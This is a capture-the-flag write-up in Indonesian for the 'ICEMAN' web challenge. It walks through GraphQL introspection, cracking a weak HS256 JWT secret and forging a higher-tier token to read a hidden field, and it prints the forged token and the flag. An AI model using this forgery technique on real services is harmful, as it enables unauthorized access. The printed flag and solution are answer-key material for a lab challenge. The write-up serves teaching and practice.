# ICEMAN Writeup

Challenge ini ngasih sebuah endpoint web yang langsung me-redirect ke `/graphql`. Dari tampilan console di halaman itu kelihatan kalau aplikasi memang sengaja menyediakan GraphQL playground sederhana dengan input JWT manual lewat header `Authorization: Bearer <token>`.

## 1. Enumerasi schema GraphQL

Hal pertama yang saya cek adalah apakah introspection aktif. Ternyata aktif tanpa butuh autentikasi.

Query yang dipakai:

```graphql
{
  __schema {
    queryType { name }
    mutationType { name }
    types { name }
  }
}
```

Dari situ kelihatan ada:

- `Mutation.register(username, password)`
- `Mutation.login(username, password)`
- `Query.me`
- `Query.releasedAlbums`
- `Query.album(id)`
- `Query.label(name)`

Lalu saya introspect lagi object penting seperti `AuthPayload`, `User`, `Album`, `Label`, dan `Artist`. Hasil pentingnya:

- `AuthPayload` cuma punya field `token`
- `User` punya `username` dan `tier`
- `Album` punya field sensitif `vaultManifest`

Itu langsung jadi petunjuk bahwa kemungkinan flag ada di `vaultManifest`.

## 2. Bikin akun fan dan lihat mekanisme akses

Saya register akun biasa:

```graphql
mutation {
  register(username: "fan12345", password: "pass12345") {
    token
  }
}
```

Server mengembalikan JWT:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImZhbjEyMzQ1IiwidGllciI6ImZhbiJ9.SWW8kHII_uSNab0FEY5FsbbdTHJPEaW6nx6u-dXaVK8
```

Setelah didecode, payload-nya:

```json
{
  "username": "fan12345",
  "tier": "fan"
}
```

Waktu token itu dipakai untuk query `me`, `releasedAlbums`, atau `label`, server selalu balas error:

```text
OVO membership required. Fan accounts do not have vault access.
```

Berarti kontrol akses hanya membedakan `fan` vs `ovo`.

## 3. Uji validasi JWT

Saya coba beberapa hal standar:

- ubah payload jadi `tier: "ovo"` tapi pakai signature lama
- bikin token `alg: none`

Keduanya gagal dan dianggap tidak terautentikasi. Jadi signature memang diverifikasi.

Karena header token pakai `HS256`, berarti ada shared secret di backend. Dengan satu token valid dan payload yang kita tahu, kita bisa brute-force secret kalau ternyata lemah.

## 4. Brute-force secret JWT

Saya mulai dari wordlist kecil yang tematik dengan challenge ini. Ternyata secret-nya langsung ketemu:

```text
iceman
```

Jadi kelemahannya adalah JWT signing secret yang sangat lemah dan mudah ditebak.

## 5. Forge token tier `ovo`

Setelah tahu secret `iceman`, saya forge JWT baru dengan payload:

```json
{
  "username": "fan12345",
  "tier": "ovo"
}
```

Lalu ditandatangani ulang pakai HMAC-SHA256 dengan key `iceman`.

Token hasil forge:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImZhbjEyMzQ1IiwidGllciI6Im92byJ9.hINQdBDqGsvh7y4p8rdxf7SlxJnadujiG_kf7Ay7Y4U
```

## 6. Ambil data album unreleased

Dengan token forged itu, query berikut berhasil:

```graphql
{
  me { username tier }
  label(name: "OVO") {
    name
    artists {
      name
      albums {
        id
        title
        status
        vaultManifest
        tracks {
          number
          title
        }
      }
    }
  }
}
```

Dari response, album unreleased `ICEMAN` muncul dan field `vaultManifest` berisi flag:

```text
dalctf2026{open-ticket-send-me-ur-fav-song-in-album6}
```
